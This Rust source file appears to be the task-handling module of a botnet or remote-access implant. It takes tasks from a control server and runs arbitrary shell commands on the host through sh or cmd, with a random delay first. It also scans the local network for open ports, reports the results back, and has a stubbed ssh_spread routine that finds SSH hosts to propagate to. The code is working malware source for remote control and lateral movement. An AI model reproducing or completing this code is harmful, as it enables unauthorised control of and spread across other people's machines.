mod network_scan;
mod ssh_spread;

use std::{
    process::Command,
    str,
    thread,
    time,
    sync::Mutex,
    io::Read,
};
use std::char::MAX;
use std::cmp::min;
use std::error::Error;
use std::process::{Child, Stdio};
use lazy_static::lazy_static;
use rand::Rng;
use crate::models::{
    Task,
    TaskResult,
};
pub use crate::tasks::network_scan::{
    scan_local_net,
    NetworkHost,
    Port,
};
use crate::tasks::ssh_spread::{
    ssh_connect
};


const TERMINAL_CMD: &'static str = "terminal";
const ABORT_CMD: &'static str = "abort";
const NETWORK_SCAN_CMD: &'static str = "network_scan";
const DEFAULT_MIN_WAIT: u32 = 0;
const DEFAULT_MAX_WAIT: u32 = 500;
const ABORTED_STATUS_CODE: i32 = -3;

const MAX_PORT: u16 = 65534;
const MIN_PORT: u16 = 0;
const COMMON_PORTS: &[u16] = &[21, 22, 23, 25, 53, 80, 443, 8000, 8080, 8443
//    80, 23, 443, 21, 22, 25, 3389, 110, 445, 139, 143, 53, 135, 3306, 8080, 1723, 111, 995, 993,
//    5900, 1025, 587, 8888, 199, 1720, 465, 548, 113, 81, 6001, 10000, 514, 5060, 179, 1026, 2000,
//    8443, 8000, 32768, 554, 26, 1433, 49152, 2001, 515, 8008, 49154, 1027, 5666, 646, 5000, 5631,
//    631, 49153, 8081, 2049, 88, 79, 5800, 106, 2121, 1110, 49155, 6000, 513, 990, 53, 57, 427,
//    49156, 543, 544, 5101, 144, 7, 389, 8009, 3128, 444, 9999, 5009, 7070, 5190, 3000, 5432, 1900,
//    3986, 13, 1029, 9, 5051, 6646, 49157, 1028, 873, 1755, 2717, 4899, 9100, 119, 37,
];

lazy_static! {
    static ref RUNNING_TASKS: Mutex<RunningTasks> = Mutex::new(RunningTasks{
        running_tasks: vec![],
        task_results: vec![]
    });
    //static ref TASK_RESULTS: Mutex<Vec<TaskResult>> = Mutex::new(Vec::new());
}



/// Struct containing all running tasks
struct RunningTasks {
    // Running child tasks
    running_tasks: Vec<RunningTask>,
    // Task results received from asynchronous tasks
    task_results: Vec<TaskResult>,
}

/// Implementation of RunningTasks methods
impl RunningTasks {
    /// Used to add a running task
    pub fn add_task(&mut self, running_task: RunningTask) {
        self.running_tasks.push(running_task);
    }

    /// Used to check and get the running tasks who are completed
    ///
    /// # Returns
    /// Vector containing TaskResult from the completed tasks
    fn get_completed_tasks(&mut self) -> Vec<TaskResult> {
        let mut removed = 0;
        let mut complete_tasks: Vec<TaskResult> = vec![];
        #[cfg(debug_assertions)]
        println!("Checking for completed tasks..");

        for i in 0..self.running_tasks.len() {
            let t = self.running_tasks.get_mut(i - removed).unwrap();
            if t.is_complete() {
                let tr = t.get_result().unwrap();
                #[cfg(debug_assertions)] {
                    println!("#{} complete. Resulting output:", t.id);
                    println!("{}", tr.result);
                }
                complete_tasks.push(tr);

                self.running_tasks.remove(i - removed);
                removed += 1;
            } else {
                #[cfg(debug_assertions)]
                println!("Task #{} is not complete", t.id);
            }
        }
        for tr in &self.task_results {
            #[cfg(debug_assertions)] {
                println!("#{} complete. Resulting output:", tr.id);
                println!("{}", tr.result);
            }
            complete_tasks.push(tr.clone());
        }
        self.task_results = Vec::new();

        #[cfg(debug_assertions)] {
            if complete_tasks.is_empty() {
                println!("No completed tasks");
            }
        }

        complete_tasks
    }

    fn add_task_result(&mut self, task_result: TaskResult) {
        self.task_results.push(task_result);
    }

    /// Aborts all running tasks
    fn abort_all(&mut self) {
        for t in self.running_tasks.iter_mut() {
            t.abort_task();
        }
    }

    /// Aborts a single running task, if id exists
    fn abort_task(&mut self, id: String) {
        for t in self.running_tasks.iter_mut() {
            if t.id == id {
                t.abort_task();
                break;
            }
        }
    }
}

/// Struct representing ta running task
struct RunningTask {
    id: String,
    child: Child,
}

/// Methods for the RunningTask struct
impl RunningTask {
    /// Checks weather a running task is completed or not
    ///
    /// # Returns
    /// If complete, true, else false
    pub fn is_complete(&mut self) -> bool {
        match self.child.try_wait() {
            Ok(Some(_)) => true,
            _ => false
        }
    }

    /// Get a TaskResult from a running task
    ///
    /// # Returns
    /// If the task is completed, a TaskResult containing output from the task is returned,
    /// otherwise if the task is not completed, None is returned
    pub fn get_result(&mut self) -> Option<TaskResult> {
        let exit_status = match self.child.try_wait() {
            Ok(Some(val)) => val,
            _ => return None
        };

        let option = exit_status.code();
        let exit_code = match option {
            Some(val) => val,
            _ => ABORTED_STATUS_CODE
        };
        let stdout = self.child.stdout.take();
        let stderr = self.child.stderr.take();
        let mut result = String::new();

        match exit_code {
            0 => {
                if let Some(_) = stdout {
                    stdout.unwrap()
                        .read_to_string(&mut result)
                        .expect("Failed to read stdout");
                } else {
                    #[cfg(debug_assertions)]
                    println!("Command had no output!");
                };
            }
            ABORTED_STATUS_CODE => {
                #[cfg(debug_assertions)]
                println!("Command aborted => no output returned");
            }
            _ => {
                if let Some(_) = stderr {
                    stderr.unwrap()
                        .read_to_string(&mut result)
                        .expect("Failed to read stderr");
                } else {
                    #[cfg(debug_assertions)]
                    println!("Command had no output!");
                };
            }
        }

        Some(TaskResult {
            id: self.id.clone(),
            status: exit_code,
            result,
        })
    }

    /// Kills the running task by killing the child process
    pub fn abort_task(&mut self) {
        #[cfg(debug_assertions)]
        println!("Aborting task #{}", self.id);

        self.child.kill().expect("Failed to kill task");
    }
}


/// Used to check and get the running tasks who are completed
///
/// # Returns
/// Vector containing TaskResult from the completed tasks
pub fn check_completed() -> Vec<TaskResult> {
    RUNNING_TASKS.lock().unwrap().get_completed_tasks()
}

/// Run a task received from the control server
pub fn run_task(task: Task) {
    #[cfg(debug_assertions)] {
        println!("Running {} task #{} ({}-{}ms): {}",
                 task.name,
                 task.id,
                 task.min_delay,
                 task.max_delay,
                 task.data);
    }

    let wait = if task.min_delay < task.max_delay {
        rand::thread_rng().gen_range(task.min_delay, task.max_delay)
    } else if task.min_delay == task.max_delay {
        0
    } else {
        rand::thread_rng().gen_range(DEFAULT_MIN_WAIT, DEFAULT_MAX_WAIT)
    };

    thread::sleep(time::Duration::from_millis(wait as u64));

    // Add more command types here when supported by server and implemented in client
    match &task.name[..] {
        TERMINAL_CMD => {
            let child = terminal_command(task.data);
            let rt = RunningTask {
                id: task.id,
                child,
            };
            RUNNING_TASKS.lock()
                .unwrap()
                .add_task(rt);
        }
        ABORT_CMD => {
            let mut rts = RUNNING_TASKS.lock().unwrap();
            if task.data.is_empty() {
                rts.abort_all();
            } else {
                for id in task.data.split(',') {
                    rts.abort_task(id.trim().to_string());
                }
            }
        }
        NETWORK_SCAN_CMD => {
            /*let ports: Vec<u16> = task.data.split(',')
                .collect::<Vec<&str>>()
                .into_iter()
                .map(|port_s| {
                    let p = port_s.trim().parse().unwrap_or_default();
                    p
                })
                .filter(|p| *p != 0 as u16)
                .collect();
             */
            let ports = parse_ports(task.data);
            thread::spawn(|| {
                network_scan(task.id, ports);
            });
        }
        _ => {}
    }
}

/// Runs a terminal command at the client host
fn terminal_command(command: String) -> Child {
    if cfg!(target_os = "windows") {
        Command::new("cmd")
            .args(["/C", &command])
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .spawn()
            .expect("Failed to execute command")
    } else {
        Command::new("sh")
            .arg("-c")
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .arg(command)
            .spawn()
            .expect("Failed to execute command")
    }
}

/// Runs a network scan
/// Intended to be run on another thread than the main thread, puts the resulting data in
/// RUNNING_TASKS
pub fn network_scan(id: String, ports: Vec<u16>) {
    #[cfg(debug_assertions)]
    println!("Running network scan");
    let ports = if ports.is_empty() {
        COMMON_PORTS.to_vec()
    } else {
        ports
    };
    let hosts = match scan_local_net(ports) {
        Ok(val) => val,
        _ => {
            #[cfg(debug_assertions)]
            println!("Failed to get hosts when scanning the local network");
            Vec::new()
        }
    };
    if hosts.is_empty() {
        return;
    }
    let mut result = String::new();
    for h in hosts {
        result.push_str(&*h.to_string());
        result.push('\n');
    }
    let task_result = TaskResult {
        id,
        status: 0,
        result,
    };
    RUNNING_TASKS.lock().unwrap().add_task_result(task_result);
}

pub fn ssh_spread() {
    let ports = [22 as u16].to_vec();
    let hosts = match scan_local_net(ports) {
        Ok(val) => val,
        _ => {
            #[cfg(debug_assertions)]
            println!("Failed to get hosts when scanning the local network");
            Vec::new()
        }
    };
    if hosts.is_empty() {
        return;
    }
}

/// Parses a range string and pushes the port numbers into ports
///
/// # Example
/// range_string '1-5' will push 1,2,3,4,5 into ports
/// range string '-5' will push 1,2,3,4,5 into ports
/// range string '65533-' will push 65533, 65534 into ports
/// range string '-' will push all ports between MIN_PORT and MAX_PORT into ports
///
/// # Errors
/// If the range string is invalid
fn push_port_range(range_str: &str, ports: &mut Vec<u16>) -> Result<(), anyhow::Error> {
    let split = range_str.split('-').collect::<Vec<&str>>();
    let mut min_port;
    let mut max_port;

    if split.len() != 2 {
        return Err(anyhow::Error::msg("Failed parse range, split on '-' to long"));
    }

    if split[0] == "" {
        min_port = MIN_PORT;
    } else {
        min_port = split[0].trim().parse().unwrap_or_default();
    }

    if split[1] == "" {
        max_port = MAX_PORT;
    } else {
        max_port = split[1].trim().parse().unwrap_or_default();
    }
    if min_port >= max_port {
        return Err(anyhow::Error::msg("Failed parse range, min larger or eq than max"));
    }

    for i in min_port..(max_port + 1) {
        ports.push(i);
    }
    Ok(())
}

/// Parses all the ports in a string
///
/// # Example
/// port string '-5,6,7' will return [1,2,4,5,6,7]
fn parse_ports(port_string: String) -> Vec<u16> {
    let mut ports: Vec<u16> = Vec::new();
    let split_port_string = port_string.split(',').collect::<Vec<&str>>();
    for ps in split_port_string {
        let p = ps.trim();
        if p.contains('-') {
            match push_port_range(ps, &mut ports) {
                Ok(_) => {},
                Err(e) => {
                    #[cfg(debug_assertions)]
                    println!("Failed to parse port range: {}", e);
                }
            };
        } else {
            ports.push(p.parse().unwrap_or_default());
        }
    }
    ports.into_iter()
        .filter(|p| *p != 0 as u16)
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    fn test_port_range(port_string: &str, expected: &[u16]) {
        let ports = parse_ports(port_string.to_string());
        for i in 0..ports.len() {
            assert_eq!(ports[i], expected[i]);
        }
    }

    const PORT_STRING_1: &'static str = "20, 21, 22,23";
    const EXPECTED_1: [u16; 4] = [20, 21, 22, 23];

    #[test]
    fn test_parse_port_string() {
        test_port_range(PORT_STRING_1, &EXPECTED_1);
    }

    const PORT_STRING_2: &'static str = "20, 21-25,80";
    const EXPECTED_2: [u16; 7] = [20, 21, 22, 23, 24, 25, 80];

    #[test]
    fn test_parse_port_string_range() {
        test_port_range(PORT_STRING_2, &EXPECTED_2);
    }

    const PORT_STRING_3: &'static str = "20, 21-25-,80";
    const EXPECTED_3: [u16; 2] = [20, 80];

    #[test]
    fn test_parse_port_string_invalid_range_1() {
        test_port_range(PORT_STRING_3, &EXPECTED_3);
    }

    const PORT_STRING_4: &'static str = "20, -21-25,80";
    const EXPECTED_4: [u16; 2] = [20, 80];

    #[test]
    fn test_parse_port_string_invalid_range_2() {
        test_port_range(PORT_STRING_4, &EXPECTED_4);
    }

    const PORT_STRING_5: &'static str = "-3, 20,80";
    const EXPECTED_5: [u16; 5] = [1, 2, 3, 20, 80];

    #[test]
    fn test_parse_port_string_0_to_n_range() {
        test_port_range(PORT_STRING_5, &EXPECTED_5);
    }

    const PORT_STRING_6: &'static str = "20,80, 65533-";
    const EXPECTED_6: [u16; 4] = [20, 80, 65533, 65534];

    #[test]
    fn test_parse_port_string_n_to_max() {
        test_port_range(PORT_STRING_6, &EXPECTED_6);
    }

    const PORT_STRING_7: &'static str = "";
    const EXPECTED_7: [u16; 0] = [];

    #[test]
    fn test_parse_port_string_empty() {
        test_port_range(PORT_STRING_7, &EXPECTED_7);
    }
}